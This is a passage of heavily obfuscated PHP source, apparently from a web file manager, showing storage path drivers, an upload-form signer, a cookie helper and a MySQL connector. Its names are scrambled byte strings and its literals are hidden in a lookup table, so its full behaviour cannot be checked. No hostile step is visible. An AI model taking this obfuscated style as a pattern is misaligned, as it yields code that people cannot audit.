$Ï¶·ˆ’Á[$À“Šıö¤[180]]; } } break; default: $È†êÄçÂ = $´°ì¥[$À“Šıö¤[84]]; $ÙıÂâœ“ = array($À“Šıö¤[1200] => $À“Šıö¤[1209]); break; } $èšÊÀÓ³ = $´°ì¥[$À“Šıö¤[84]]; if (!isset(self::$driverCache[$èšÊÀÓ³])) { $ü™ÒÏÌÙ = strtolower($ÙıÂâœ“[$À“Šıö¤[95]]); $‹›Üê’˜ = $GLOBALS[$À“Šıö¤[6]][$À“Šıö¤[89]][$À“Šıö¤[851]]; $è‡ãÍ— = $À“Šıö¤[74] . (isset($‹›Üê’˜[$ü™ÒÏÌÙ]) ? $‹›Üê’˜[$ü™ÒÏÌÙ] : ucfirst($ü™ÒÏÌÙ)); if (!class_exists($è‡ãÍ—)) { show_json("{$è‡ãÍ—}\x20\x6e\157\164\x20\x65\170\x69\x73\164\163\x21", !1); } $•³»«­Ø = isset($ÙıÂâœ“[$À“Šıö¤[6]]) ? $ÙıÂâœ“[$À“Šıö¤[6]] : !1; self::$driverCache[$èšÊÀÓ³] = new $è‡ãÍ—($•³»«­Ø); } $â¹ï¬òš = self::$driverCache[$èšÊÀÓ³]; $â¹ï¬òš->pathDriver = $›çøÍˆ; $â¹ï¬òš->pathBase = $À“Šıö¤[12]; if (isset($ÙıÂâœ“[$À“Šıö¤[6]][$À“Šıö¤[1210]])) { $â¹ï¬òš->pathBase = rtrim($ÙıÂâœ“[$À“Šıö¤[6]][$À“Šıö¤[1210]], $À“Šıö¤[8]) . $À“Šıö¤[8]; $È†êÄçÂ = $â¹ï¬òš->pathBase . ltrim($È†êÄçÂ, $À“Šıö¤[8]); } $È†êÄçÂ = $â¹ï¬òš->getPath($È†êÄçÂ); if (isset($´°ì¥[$À“Šıö¤[1181]])) { $È†êÄçÂ = $´°ì¥[$À“Šıö¤[1181]]; } $â¹ï¬òš->path = $È†êÄçÂ; return $â¹ï¬òš; } public static function errorTips($±† ìØ = false) { $‡©ÂÍ„Š =& $_SERVER[™»È’øè]; static $°ç³˜—Î = array(); $ĞıíÒ¤ = 1000; if ($±† ìØ === -1) { return $°ç³˜—Î ? $°ç³˜—Î[count($°ç³˜—Î) - 1] : $‡©ÂÍ„Š[12]; } if ($±† ìØ === !1) { return implode($‡©ÂÍ„Š[245], $°ç³˜—Î); } if (count($°ç³˜—Î) >= $ĞıíÒ¤) { $°ç³˜—Î = array_slice($°ç³˜—Î, $ĞıíÒ¤ * 0.5, $ĞıíÒ¤); } $°ç³˜—Î[] = $±† ìØ; write_log($‡©ÂÍ„Š[162] . ACTION . $‡©ÂÍ„Š[1211] . $±† ìØ, $‡©ÂÍ„Š[1212]); } public static function getLastError($éÜÑüÀë = '') { $©Ä…Ìı = self::errorTips(-1); return $©Ä…Ìı ? $©Ä…Ìı : $éÜÑüÀë; } } goto B®¨ÑªÂå§; a´ÅÏƒ·Î¯: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ôÓ£Åæß) { parent::__construct($ôÓ£Åæß); $this->signatureVersion($_SERVER[™»È’øè][230]); } public function uploadFormData($ª„åº›¼, $âİıˆ¿ò = 3600) { $÷åÕÜù¿ =& $_SERVER[™»È’øè]; $¡ñ„Ñ¦… = $÷åÕÜù¿[212]; $õÎÑÅšÀ = $÷åÕÜù¿[246]; $ş«‡ÄŒº = $÷åÕÜù¿[256]; $Ãä‚´ªè = gmdate($÷åÕÜù¿[1354], time() + $âİıˆ¿ò); $”†º´Â¨ = (string) time() . $÷åÕÜù¿[71] . (string) (time() + $âİıˆ¿ò); $…’Áæ˜ = array($÷åÕÜù¿[257] => $Ãä‚´ªè, $÷åÕÜù¿[260] => array(array($÷åÕÜù¿[262] => $¡ñ„Ñ¦…), array($÷åÕÜù¿[261] => $this->bucket), array($÷åÕÜù¿[263], $÷åÕÜù¿[264], $÷åÕÜù¿[12]), array($÷åÕÜù¿[267] => $ş«‡ÄŒº), array($÷åÕÜù¿[1355] => $õÎÑÅšÀ), array($÷åÕÜù¿[1356] => $this->accessKey), array($÷åÕÜù¿[1357] => $”†º´Â¨))); $…’Áæ˜ = json_encode($…’Áæ˜); $²¯ˆÖ‘’ = hash_hmac($÷åÕÜù¿[246], $”†º´Â¨, $this->secret); $á¼ƒ³Ô° = sha1($…’Áæ˜); $²†€ßû = hash_hmac($÷åÕÜù¿[246], $á¼ƒ³Ô°, $²¯ˆÖ‘’); $ç€·îÊ‰ = array($÷åÕÜù¿[262] => $¡ñ„Ñ¦…, $÷åÕÜù¿[267] => $ş«‡ÄŒº, $÷åÕÜù¿[275] => base64_encode($…’Áæ˜), $÷åÕÜù¿[1355] => $õÎÑÅšÀ, $÷åÕÜù¿[1356] => $this->accessKey, $÷åÕÜù¿[1358] => $”†º´Â¨, $÷åÕÜù¿[1359] => $²†€ßû, $÷åÕÜù¿[195] => $this->getHost()); return $ç€·îÊ‰; } public function fileOutLink($û¯»®ıÙ) { $ÖºÄ˜ˆ =& $_SERVER[™»È’øè]; if (substr($û¯»®ıÙ, 0, 7) == $ÖºÄ˜ˆ[1360]) { $û¯»®ıÙ = $ÖºÄ˜ˆ[1361] . substr($û¯»®ıÙ, 7); } header($ÖºÄ˜ˆ[161] . $û¯»®ıÙ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ĞÅÕ­ÅÏ) { $this->pathParse = $ĞÅÕ­ÅÏ; $this->model = Model($_SERVER[™»È’øè][1362]); } public function getPath($‘õ¿˜àÌ) { return trim($‘õ¿˜àÌ, $_SERVER[™»È’øè][8]); } public function pathFather($ßÍ³ÃºÁ) { $¹ûĞÄ‹‚ = $this->parse($ßÍ³ÃºÁ); $¹ûĞÄ‹‚ = $this->infoSimple($ßÍ³ÃºÁ); return $¹ûĞÄ‹‚ ? $¹ûĞÄ‹‚[$_SERVER[™»È’øè][179]] : !1; } public function pathThis($œÒÇÚöá) { $ãçƒã½È = $this->infoSimple($œÒÇÚöá); return $ãçƒã½È ? $ãçƒã½È[$_SERVER[™»È’øè][32]] : !1; } public function getPathOuter($¢ñøšàú) { if (!$¢ñøšàú) { return $¢ñøšàú; } $’‡ÄÎ§‚ = $this->parse($¢ñøšàú); return KodIO::make($’‡ÄÎ§‚[$_SERVER[™»È’øè][442]]); } public function copyFolderFromIO($¡ñé’á, $ÔÚ£„¬‘, $ §ì”È¨, $Úó¢ª’Û, $‘ƒëÖ¶) { $°ƒ„ùÜÖ = $this->model->copyFolderFromIO($¡ñé’á, $ÔÚ£„¬‘, $ §ì”È¨, $Úó¢ª’Û, $‘ƒëÖ¶); return KodIO::make($°ƒ„ùÜÖ); } public function isParentOf($—ÙŒ¹¬, $›‡êï‰›) { return $this->model->isParentOf($—ÙŒ¹¬, $›‡êï‰›); } public function mkfile($Å´”Óñˆ, $»¹Çø’Ã = '', $ıÇ–âÜİ = REPEAT_RENAME) { $È›Àùì =& $_SERVER[™»È’øè]; $ğÁä³Á = $this->parse($Å´”Óñˆ); $Å´”Óñˆ = $ğÁä³Á[$È›Àùì[442]]; for ($¸‡ìÃÄ = 0; $¸‡ìÃÄ < count($ğÁä³Á[$È›Àùì[1363]]); $¸‡ìÃÄ++) { $»Â¾½‰ˆ = $ğÁä³Á[$È›Àùì[1363]][$¸‡ìÃÄ]; if ($¸‡ìÃÄ == count($ğÁä³Á[$È›Àùì[1363]]) - 1) { $Å´”Óñˆ = $this->model->mkfile($Å´”Óñˆ, $»Â¾½‰ˆ, $»¹Çø’Ã, $ıÇ–âÜİ); break; } $Å´”Óñˆ = $this->model->mkdir($Å´”Óñˆ, $»Â¾½‰ˆ, REPEAT_SKIP); } return $this->getPathOuter($Å´”Óñˆ); } public function mkdir($‡£´œü·, $ƒÖã˜’ = REPEAT_SKIP) { $ı·ïİ§ì =& $_SERVER[™»È’øè]; $¢€Ÿ£óê = $this->parse($‡£´œü·); $‡£´œü· = $¢€Ÿ£óê[$ı·ïİ§ì[442]]; for ($÷éääõÀ = 0; $÷éääõÀ < count($¢€Ÿ£óê[$ı·ïİ§ì[1363]]); $÷éääõÀ++) { $ÍáÇ˜²” = $¢€Ÿ£óê[$ı·ïİ§ì[1363]][$÷éääõÀ]; $‡£´œü· = $this->model->mkdir($‡£´œü·, $ÍáÇ˜²”, $ƒÖã˜’); } return $this->getPathOuter($‡£´œü·); } public function copyFile($—Ó…»§ô, $½»£Ã¤İ, $©×³Ş‰é = REPEAT_REPLACE) { $ÀÙàüóÜ =& $_SERVER[™»È’øè]; $¢—Æ¯Ó· = $this->parse($½»£Ã¤İ); $ÙõÎÚ•‰ = $this->model->copy($—Ó…»§ô, $¢—Æ¯Ó·[$ÀÙàüóÜ[442]], $©×³Ş‰é, $¢—Æ¯Ó·[$ÀÙàüóÜ[84]]); return $ÙõÎÚ•‰ ? $this->getPathOuter($ÙõÎÚ•‰) : !1; } public function moveFile($÷©²‰ê½, $ãˆ”¦‘Ç, $ë‡¿âÚß = REPEAT_REPLACE) { $¡˜‚ÊÕã =& $_SERVER[™»È’øè]; $Ø‰Ü = $this->parse($ãˆ”¦‘Ç); $­¤Æ¡¢™ = $this->model->move($÷©²‰ê½, $Ø‰Ü[$¡˜‚ÊÕã[442]], $ë‡¿âÚß, $Ø‰Ü[$¡˜‚ÊÕã[84]]); return $­¤Æ¡¢™ ? $this->getPathOuter($­¤Æ¡¢™) : !1; } public function copy($†ıãâÛ„, $ı’çôÈˆ, $İÉ°ôĞè = REPEAT_REPLACE, $ã§ØÎÁş = false) { $æ§‘÷¿õ = $this->parse($ı’çôÈˆ); $´½»Õ£ó = $this->model->copy($†ıãâÛ„, $æ§‘÷¿õ[$_SERVER[™»È’øè][442]], $İÉ°ôĞè, $ã§ØÎÁş); return $´½»Õ£ó ? $this->getPathOuter($´½»Õ£ó) : !1; } public function moveSameAllow() { } public function move($ó«Ğò´º, $ï®¿íŒõ, $²ó áõ¨ = REPEAT_REPLACE, $òİŠ¾²é = false) { $ıæÀŠ“ = $this->parse($ï®¿íŒõ); $­Å‹†æÖ = $this->model->move($ó«Ğò´º, $ıæÀŠ“[$_SERVER[™»È’øè][442]], $²ó áõ¨, $òİŠ¾²é); return $­Å‹†æÖ ? $this->getPathOuter($­Å‹†æÖ) : !1; } public function remove($©öÍÙÆÛ, $¸Ç«’§ö = true) { return $this->model->remove($©öÍÙÆÛ, $¸Ç«’§ö); } public function rename($¡Ğ¦ÒÌŞ, $Ğ€ôìùÇ) { $²ÑÏó¢ó = $this->model->rename($¡Ğ¦ÒÌŞ, $Ğ€ôìùÇ); return $²ÑÏó¢ó ? $this->getPathOuter($¡Ğ¦ÒÌŞ) : $²ÑÏó¢ó; } public function size($“ìÖ¡ü) { $œû×†áå = $this->infoSimple($“ìÖ¡ü); return $œû×†áå ? $œû×†áå[$_SERVER[™»È’øè][76]] : 0; } public function infoSimple($›æıúÖ‘) { return $this->model->sourceInfo($›æıúÖ‘); } public function info($Ç•›á¥ƒ) { return $this->infoParse($Ç•›á¥ƒ); } public function infoAuth($‹Á•ğÑ½) { return $this->infoParse($‹Á•ğÑ½, !1, !0); } public function infoWithChildren($ıÎî®ÓÎ) { return $this->infoParse($ıÎî®ÓÎ, !0); } protected function infoParse($øÈïÀ¡•, $ıãè‹‹Ş = false, $¢¼”ëú = false) { if (!$ıãè‹‹Ş) { return $this->model->pathInfo($øÈïÀ¡•, $¢¼”ëú); } return $this->model->pathInfoMore($øÈïÀ¡•); } public function infoFullSimple($ãşë¢ÇÎ) { $åÙ§‘´œ =& $_SERVER[™»È’øè]; $ò¯íõß£ = explode($åÙ§‘´œ[8], $ãşë¢ÇÎ); $±ˆ¢´ö™ = implode($åÙ§‘´œ[8], array_splice($ò¯íõß£, 1)); return $this->model->pathInfoByPath($ò¯íõß£[0], $±ˆ¢´ö™); } public function infoFull($µ­Ôóá¥) { $²¯Ş†¤ü = $this->infoFullSimple($µ­Ôóá¥); return is_array($²¯Ş†¤ü) ? $this->model->pathInfo($²¯Ş†¤ü[$_SERVER[™»È’øè][180]]) : !1; } public function hashSimple($¢Ûà§»˜) { $ªå½ú‰Ô =& $_SERVER[™»È’øè]; $³İèàã = $this->infoWithChildren($¢Ûà§»˜); return $³İèàã[$ªå½ú‰Ô[515]][$ªå½ú‰Ô[639]]; } public function hashMd5($ëïæ­á) { $Š•óÏÙ =& $_SERVER[™»È’øè]; $ñ¯òØÑ = $this->infoWithChildren($ëïæ­á); return $ñ¯òØÑ[$Š•óÏÙ[515]][$Š•óÏÙ[640]]; } public function exist($Ü¸ı¹Ï‡) { $º­€÷ï­ =& $_SERVER[™»È’øè]; $¨İÚÌÁ· = $this->parse($Ü¸ı¹Ï‡); if (!$¨İÚÌÁ·[$º­€÷ï­[84]]) { return $this->isFile($Ü¸ı¹Ï‡) || $this->isFolder($Ü¸ı¹Ï‡); } $Ñç®ğÖ° = array($º­€÷ï­[444] => $¨İÚÌÁ·[$º­€÷ï­[442]], $º­€÷ï­[32] => $¨İÚÌÁ·[$º­€÷ï­[84]]); $ƒÄöĞ»Î = $this->model->where($Ñç®ğÖ°)->find(); return $ƒÄöĞ»Î ? !0 : !1; } public function isFile($™Õæõèı) { $ÆœĞî¹ =& $_SERVER[™»È’øè]; $¤ñ„ßÒ = $this->infoSimple($™Õæõèı); return $¤ñ„ßÒ && $¤ñ„ßÒ[$ÆœĞî¹[452]] == $ÆœĞî¹[211] ? !0 : !1; } public function isFolder($‘Æˆ°îı) { $‘×ı½ =& $_SERVER[™»È’øè]; $¢æøŒ„Ä = $this->infoSimple($‘Æˆ°îı); return $¢æøŒ„Ä && $¢æøŒ„Ä[$‘×ı½[452]] == $‘×ı½[88] ? !0 : !1; } public function listPath($ğ†ë¼ó, $ÎÈ‹™Õ = false) { $éà¿ø®¼ =& $_SERVER[™»È’øè]; if ($ğ†ë¼ó == $éà¿ø®¼[12]) { return !1; } $¶õ–¤Ø = array($éà¿ø®¼[444] => $ğ†ë¼ó); if ($ÎÈ‹™Õ) { return $this->model->listSource($¶õ–¤Ø, -1); } return $this->model->listSource($¶õ–¤Ø); } public function has($ù½í’â…, $Ú¯Œİ¸Ú = false, $‰ æ§ÛÄ = null) { $‚Ó¦Òº =& $_SERVER[™»È’øè]; $€„¥À– = $this->infoWithChildren($ù½í’â…); if ($Ú¯Œİ¸Ú) { return array($‚Ó¦Òº[223] => $€„¥À–[$‚Ó¦Òº[223]], $‚Ó¦Òº[222] => $€„¥À–[$‚Ó¦Òº[222]]); } return $‰ æ§ÛÄ ? $€„¥À–[$‚Ó¦Òº[223]] : $€„¥À–[$‚Ó¦Òº[222]]; } public function listAll($¹¾°Œ„ğ) { $ÉãÓëá” = IO::info($this->pathParse[$_SERVER[™»È’øè][84]]); if (!$ÉãÓëá”) { return array(); } return $this->model->listAll($¹¾°Œ„ğ); } public function getContent($ôÜËí) { return $this->model->getContent($ôÜËí); } public function setContent($ÆÖÊë‘É, $çÅ¡·ü = '') { return $this->model->setContent($ÆÖÊë‘É, $çÅ¡·ü); } public function fileSubstr($¥æÀĞÂğ, $Œ‹ÆÃãõ, $ú§¯ˆ€º) { return $this->model->fileSubstr($¥æÀĞÂğ, $Œ‹ÆÃãõ, $ú§¯ˆ€º); } public function download($‚ÉİğÈ×, $¢íó¡ı¸ = '') { $«“ƒŞ± = get_path_father($¢íó¡ı¸); $÷ÄÒşó = get_path_this($¢íó¡ı¸); $šÌãñ…ó = $this->model->fileInfoGet($‚ÉİğÈ×); $Ë»µ‡Ã = IO::copy($šÌãñ…ó[$_SERVER[™»È’øè][84]], $«“ƒŞ±, !1, $÷ÄÒşó); return $Ë»µ‡Ã; } public function setModifyTime($¥‰ÎÀè, $™šÑ®¹Õ = '') { $şúù£ÈÔ =& $_SERVER[™»È’øè]; if (!$¥‰ÎÀè) { return; } $this->model->where(array($şúù£ÈÔ[458] => $¥‰ÎÀè))->save(array($şúù£ÈÔ[85] => $™šÑ®¹Õ)); } public function upload($æŒğÎçá, $¾å•™§, $²Æâ¯Ä¤ = false, $şÆÜôë· = REPEAT_REPLACE) { $òÍê¯ˆ„ =& $_SERVER[™»È’øè]; $¼­‹ŞúÌ = $this->parse($æŒğÎçá); $¢ŸùÕª = $this->model->addFile($¼­‹ŞúÌ[$òÍê¯ˆ„[442]], $¾å•™§, $¼­‹ŞúÌ[$òÍê¯ˆ„[84]], $²Æâ¯Ä¤, $şÆÜôë·); return $this->getPathOuter($¢ŸùÕª); } public function uploadFileByID($ŞâÅ§ö—, $ßàòˆùê, $·ûîÖü) { $¿¸ŠîÓ =& $_SERVER[™»È’øè]; $›–”òìê = $this->parse($ŞâÅ§ö—); $Çø¿İÂë = $this->model->addFileByFileID($›–”òìê[$¿¸ŠîÓ[442]], $ßàòˆùê, $›–”òìê[$¿¸ŠîÓ[84]], $·ûîÖü); return $this->getPathOuter($Çø¿İÂë); } public function addFileByRemote($–¢€¿’ç, $Ê”º‚œ·, $ïı°¿š¾ = array(), $íü¼Åï‰ = '', $ˆ”“—¼) { $ÃÅ¯ÆÒç =& $_SERVER[™»È’øè]; $©â€ß‚³ = $this->parse($–¢€¿’ç); $íü¼Åï‰ = empty($íü¼Åï‰) ? $©â€ß‚³[$ÃÅ¯ÆÒç[84]] : $íü¼Åï‰; $×ˆ›±¸ = $this->model->addFileByRemote($©â€ß‚³[$ÃÅ¯ÆÒç[442]], $Ê”º‚œ·, $íü¼Åï‰, $ïı°¿š¾, $ˆ”“—¼); return $this->getPathOuter($×ˆ›±¸); } public function uploadLink($±î‰­õï, $¨™ííØÆ = 0) { $ôØ¸¸Ä =& $_SERVER[™»È’øè]; $ÇŞü…÷İ = $this->parse($±î‰­õï); $Åè¿ğÀÇ = _get($GLOBALS[$ôØ¸¸Ä[7]], $ôØ¸¸Ä[1364]); $áÓ…´»³ = _get($GLOBALS[$ôØ¸¸Ä[7]], $ôØ¸¸Ä[1365]); $±î‰­õï = Model($ôØ¸¸Ä[642])->createFileName($ÇŞü…÷İ[$ôØ¸¸Ä[84]], $Åè¿ğÀÇ, $áÓ…´»³); return IO::uploadLink($±î‰­õï, $¨™ííØÆ); } public function fileNameAuto($È¸µşøÃ, $á ¡©Áñ, $¡­ªõÁ‘ = REPEAT_REPLACE, $®Ş°èü = false) { return $this->model->fileNameAuto($È¸µşøÃ, $á ¡©Áñ, $¡­ªõÁ‘, $®Ş°èü); } public function fileNameExist($¡‡æ´ÕÉ, $øÒƒ„›) { return $this->model->fileNameExist($¡‡æ´ÕÉ, $øÒƒ„›); } protected function _fileOut($ï Ğçá, $üÛüÑì = false, $úñë¼½ = false, $ïîììã¸ = '', $öØÍÑÏû = false) { $±ÄıÆ¬ó =& $_SERVER[™»È’øè]; $÷‚¸„Ï¸ = $this->model->sourceInfo($ï Ğçá); if ($÷‚¸„Ï¸[$±ÄıÆ¬ó[452]] == $±ÄıÆ¬ó[88]) { header($±ÄıÆ¬ó[1366]); die; } $“€ö÷ = $this->model->fileInfoGet($ï Ğçá); $ïîììã¸ = $“€ö÷[$±ÄıÆ¬ó[640]] ? $“€ö÷[$±ÄıÆ¬ó[640]] : $ïîììã¸; $ÌîØÒã = is_array($GLOBALS[$±ÄıÆ¬ó[168]]) ? $GLOBALS[$±ÄıÆ¬ó[168]][$±ÄıÆ¬ó[32]] : $÷‚¸„Ï¸[$±ÄıÆ¬ó[32]]; if ($öØÍÑÏû) { return IO::fileOutServer($“€ö÷[$±ÄıÆ¬ó[84]], $üÛüÑì, $ÌîØÒã, $ïîììã¸); } IO::fileOut($“€ö÷[$±ÄıÆ¬ó[84]], $üÛüÑì, $ÌîØÒã, $ïîììã¸); } public function fileOut($öšÀ›œ, $ãÅøˆ·— = false, $óü‡œâ = false, $£‰–ğ±Â = '') { $this->_fileOut($öšÀ›œ, $ãÅøˆ·—, $óü‡œâ, $£‰–ğ±Â); } public function fileOutServer($ªÂƒÂ€‰, $ÊÊæÀ“ = false, $¡Ê½¥·ğ = false, $–Ö“¾Ç° = '') { $this->_fileOut($ªÂƒÂ€‰, $ÊÊæÀ“, $¡Ê½¥·ğ, $–Ö“¾Ç°, !0); } protected function _fileOutImage($Áû„îÉ©, $âÍÕµ² = 250) { $É©äíˆ =& $_SERVER[™»È’øè]; $ˆç–ş§ = $this->model->pathInfo($Áû„îÉ©); if ($ˆç–ş§[$É©äíˆ[452]] == $É©äíˆ[88]) { show_json($É©äíˆ[1367] . $Áû„îÉ©, !1); } $†›ıß‘ = $this->model->fileInfoGet($Áû„îÉ©); $ˆç–ş§[$É©äíˆ[169]] = $†›ıß‘[$É©äíˆ[84]]; $GLOBALS[$É©äíˆ[168]] = $ˆç–ş§; IO::fileOutImage($†›ıß‘[$É©äíˆ[84]], $âÍÕµ²); } public function fileOutImage($¯Üâ†îä, $Î÷áó¤Ã = 250) { $this->_fileOutImage($¯Üâ†îä, $Î÷áó¤Ã); } public function fileOutImageServer($ÈÈ£ğÒÕ, $‹ÎªÃ½Ê = 250) { $this->_fileOutImage($ÈÈ£ğÒÕ, $‹ÎªÃ½Ê); } public function link($ÚÑÌöœ¬, $÷©§¤÷¼ = '') { $„îÑÎ€ñ = $this->model->fileInfoGet($ÚÑÌöœ¬); return IO::link($„îÑÎ€ñ[$_SERVER[™»È’øè][84]], $÷©§¤÷¼); } protected function parse($Ú·£ÃŒ“) { $¡·Á±šæ =& $_SERVER[™»È’øè]; if (strstr($Ú·£ÃŒ“, $¡·Á±šæ[8]) === !1) { return array($¡·Á±šæ[460] => intval($Ú·£ÃŒ“), $¡·Á±šæ[84] => $¡·Á±šæ[12], $¡·Á±šæ[1363] => array()); } $‘ƒ³ÒÅë = explode($¡·Á±šæ[8], trim($Ú·£ÃŒ“, $¡·Á±šæ[8])); if (count($‘ƒ³ÒÅë) < 2) { show_tips(clear_html($Ú·£ÃŒ“) . $¡·Á±šæ[1368]); } return array($¡·Á±šæ[460] => intval($‘ƒ³ÒÅë[0]), $¡·Á±šæ[84] => $‘ƒ³ÒÅë[1], $¡·Á±šæ[1363] => array_slice($‘ƒ³ÒÅë, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($½Ôò¸) { $this->pathParse = $½Ôò¸; $this->model = Model($_SERVER[™»È’øè][1362]); } public function getPathOuter($ó­¨ªúá) { $¨¹Á´ÃÒ =& $_SERVER[™»È’øè]; if (!$ó­¨ªúá) { return $ó­¨ªúá; } $“ÙÂ­°¤ = $this->parse($ó­¨ªúá); return trim(KodIO::makeShare($this->pathParse[$¨¹Á´ÃÒ[442]], $“ÙÂ­°¤[$¨¹Á´ÃÒ[442]]), $¨¹Á´ÃÒ[8]); } protected function infoParse($Á–èÀˆ¶, $¼é‘¯ß = false, $ûãÈÙÍ¦ = false) { $Àˆà²© =& $_SERVER[™»È’øè]; $Áùí–š = $this->pathParse[$Àˆà²©[442]]; $©ÊŞ½’¼ = trim($this->pathParse[$Àˆà²©[1198]], $Àˆà²©[8]); return Action($Àˆà²©[1369])->sharePathInfo($Áùí–š, $©ÊŞ½’¼, $¼é‘¯ß); } public function infoFull($«Éš›Ù£) { $€ßµ®ğû =& $_SERVER[™»È’øè]; $áèÕû“Ñ = explode($€ßµ®ğû[8], trim($«Éš›Ù£, $€ßµ®ğû[8])); if (count($áèÕû“Ñ) > 1) { $ê´ï† = implode($€ßµ®ğû[8], array_splice($áèÕû“Ñ, 1)); $»é’••ô = $this->model->pathInfoByPath($áèÕû“Ñ[0], $ê´ï†); if (!$»é’••ô) { return !1; } $this->pathParse[$€ßµ®ğû[1198]] = $»é’••ô[$€ßµ®ğû[180]]; } return $this->infoParse($«Éš›Ù£); } public function listAll($ı°›ê) { $ßÒƒ½Êó =& $_SERVER[™»È’øè]; $§÷áÙáÈ = IO::info($this->pathParse[$ßÒƒ½Êó[84]]); if (!$§÷áÙáÈ) { return array(); } $Õ…¥úâŸ = $this->model->listAll($ı°›ê); $ëæìŒ = Model($ßÒƒ½Êó[631])->getInfo($§÷áÙáÈ[$ßÒƒ½Êó[632]]); foreach ($Õ…¥úâŸ as &$ß»ÇœıÎ) { check_abort(); $ß»ÇœıÎ[$ßÒƒ½Êó[87]] = Action($ßÒƒ½Êó[1369])->_shareItemeParse($ß»ÇœıÎ[$ßÒƒ½Êó[87]], $ëæìŒ); } unset($ß»ÇœıÎ); return $Õ…¥úâŸ; } } goto F˜ŞŒÑ¢­Ò; A£²¨É—š: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($­·àá«… = '', $”î®Â”Ó = 0) { if (is_string($­·àá«…) && $­·àá«… != $_SERVER[™»È’øè][12]) { $this->prefix = $­·àá«…; } if (is_numeric($”î®Â”Ó) && $”î®Â”Ó > 0) { $this->expire = $”î®Â”Ó; } } public static function getInstance() { static $Œ˜•‹©™; if ($Œ˜•‹©™ === null) { $Œ˜•‹©™ = new self(); } return $Œ˜•‹©™; } private static $cookieDisable = false; public static function disable($”ÉÑÙõÊ) { self::$cookieDisable = $”ÉÑÙõÊ; } private static $sameCookieSet = array(); public static function set($û‘Áğı”, $­²Ÿ¢ä, $ŒŸ—Ê«¶ = 0, $›Ù  = false, $ï¢«–‡ = false) { $À«ñö÷œ =& $_SERVER[™»È’øè]; if (self::$cookieDisable) { return; } if (!$ŒŸ—Ê«¶) { $ŒŸ—Ê«¶ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$û‘Áğı”]) && self::$sameCookieSet[$û‘Áğı”] == $­²Ÿ¢ä . $ŒŸ—Ê«¶) { return; } self::$sameCookieSet[$û‘Áğı”] = $­²Ÿ¢ä . $ŒŸ—Ê«¶; if (!$ï¢«–‡) { $ï¢«–‡ = str_replace(HOST, $À«ñö÷œ[12], APP_HOST); $ï¢«–‡ = _get($GLOBALS, $À«ñö÷œ[912], $ï¢«–‡); } $Í´ºéû” = $À«ñö÷œ[12]; setcookie($û‘Áğı”, $­²Ÿ¢ä, time() + $ŒŸ—Ê«¶, $À«ñö÷œ[8] . trim($ï¢«–‡, $À«ñö÷œ[8]) . $Í´ºéû”, !1, !1, $›Ù ); } public static function setSafe($¸„¬íş», $¾Ğş—›Å, $º‰ğÁâ = 0) { self::set($¸„¬íş», $¾Ğş—›Å, $º‰ğÁâ, !0); } public static function get($“ù¨Œ») { static $ğÓÌÚı¿ = false; if (!$ğÓÌÚı¿) { self::initHeaderCookie(); $ğÓÌÚı¿ = !0; } return isset($_COOKIE[$“ù¨Œ»]) ? $_COOKIE[$“ù¨Œ»] : !1; } private static function initHeaderCookie() { $œÅƒİˆ =& $_SERVER[™»È’øè]; if (!isset($_SERVER[$œÅƒİˆ[913]]) || !$_SERVER[$œÅƒİˆ[913]]) { return; } $Ÿé“ÜÆÁ = explode($œÅƒİˆ[71], $_SERVER[$œÅƒİˆ[913]]); foreach ($Ÿé“ÜÆÁ as $·Ìé‰Şš) { $·Ìé‰Şš = explode($œÅƒİˆ[914], $·Ìé‰Şš); if (count($·Ìé‰Şš) != 2 || !isset($·Ìé‰Şš[1])) { continue; } $_COOKIE[trim($·Ìé‰Şš[0])] = trim($·Ìé‰Şš[1]); } } public static function remove($™…¬©üæ, $ƒÊùöè = false) { unset($_COOKIE[$™…¬©üæ]); self::set($™…¬©üæ, $_SERVER[™»È’øè][12], 1, $ƒÊùöè); } } class DbMysql extends Db { public function __construct($¬ÈÜëªÙ = '') { $÷£ª­¸Ó =& $_SERVER[™»È’øè]; if (!extension_loaded($÷£ª­¸Ó[829])) { think_exception(think_lang($÷£ª­¸Ó[14]) . $÷£ª­¸Ó[915]); } if (!empty($¬ÈÜëªÙ)) { $this->config = $¬ÈÜëªÙ; if (empty($this->config[$÷£ª­¸Ó[17]])) { $this->config[$÷£ª­¸Ó[17]] = $÷£ª­¸Ó[12]; } } } public function connect($“×›Í ¶ = '', $ˆŞ ½¨ş = 0, $¢»ã­ƒ¡ = false) { $©÷×¤·ı =& $_SERVER[™»È’øè]; if (!isset($this->linkID[$ˆŞ ½¨ş])) { if (empty($“×›Í ¶)) { $“×›Í ¶ = $this->config; } $“·Šãö– = $“×›Í ¶[$©÷×¤·ı[916]] . ($“×›Í ¶[$©÷×¤·ı[917]] ? "\x3a{$“×›Í ¶[$©÷×¤·ı[917]]}" : $©÷×¤·ı[12]); $¢ùÔ€ì = !empty($“×›Í ¶[$©÷×¤·ı[17]][$©÷×¤·ı[18]]) ? $“×›Í ¶[$©÷×¤·ı[17]][$©÷×¤·ı[18]] : $this->pconnect; if ($¢ùÔ€ì) { $this->linkID[$ˆŞ ½¨ş] = mysql_pconnect($“·Šãö–, $“×›Í ¶[$©÷×¤·ı[918]], $“×›Í ¶[$©÷×¤·ı[919]], 131072); } else { $this->linkID[$ˆŞ ½¨ş] = mysql_connect($“·Šãö–, $“×›Í ¶[$©÷×¤·ı[918]], $“×›Í ¶[$©÷×¤·ı[919]], !0, 131072); } if (!$this->linkID[$ˆŞ ½¨ş] || !empty($“×›Í ¶[$©÷×¤·ı[21]]) && !mysql_select_db($“×›Í ¶[$©÷×¤·ı[21]], $this->linkID[$ˆŞ ½¨ş])) { think_exception(mysql_error()); } $™À¸½ = mysql_get_server_info($this->linkID[$ˆŞ ½¨ş]); mysql_query($©÷×¤·ı[920] . think_config($©÷×¤·ı[921]) . $©÷×¤·ı[58], $this->linkID[$ˆŞ ½¨ş]); if ($™À¸½ > $©÷×¤·ı[922]) { mysql_query($©÷×¤·ı[923], $this->linkID[$ˆŞ ½¨ş]); } $this->connected = !0; if (1 != think_config($©÷×¤·ı[22])) { unset($this->config); } } return $this->linkID[$ˆŞ ½¨ş]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($×ë±íö) { $‚Õ¢¢Õ· =& $_SERVER[™»È’øè]; if (0 === stripos($×ë±íö, $‚Õ¢¢Õ·[307])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if 